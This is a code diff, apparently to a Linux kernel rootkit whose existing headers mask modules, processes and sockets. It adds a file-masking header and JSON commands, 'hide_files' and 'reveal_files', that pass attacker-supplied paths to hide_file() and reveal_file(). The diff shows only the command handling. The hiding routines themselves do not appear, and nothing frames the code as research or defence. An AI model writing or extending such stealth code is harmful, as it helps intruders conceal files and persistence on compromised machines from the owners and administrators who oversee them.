@@ -27,6 +27,7 @@
 #include "module_masking.h"		/* Needed for ... */
 #include "process_masking.h"	/* Needed for ... */
 #include "socket_masking.h"		/* Needed for ... */
+#include "file_masking.h"
 
 
 /*******************************************************************************/
@@ -243,6 +244,22 @@ static int parse_json(char *json_str)
 				printk(KERN_INFO "index %d has value %s\n", j, values[j]);
 				port = simple_strtol(values[j], &endptr, 10);
 				unmask_socket("udp6", port);
+			}
+
+		} else if (!jsoneq(json_str, &t[i], "hide_files")) {
+			count = extract_array_values(json_str);
+			printk(KERN_INFO "%s: %d\n", "hide_files", count);
+			for (j=0 ; j<count ; j++) {
+				printk(KERN_INFO "index %d has value %s\n", j, values[j]);
+				hide_file(values[j]);
+			}
+
+		} else if (!jsoneq(json_str, &t[i], "reveal_files")) {
+			count = extract_array_values(json_str);
+			printk(KERN_INFO "%s: %d\n", "reveal_files", count);
+			for (j=0 ; j<count ; j++) {
+				printk(KERN_INFO "index %d has value %s\n", j, values[j]);
+				reveal_file(values[j]);
 			}
 
 		} else {
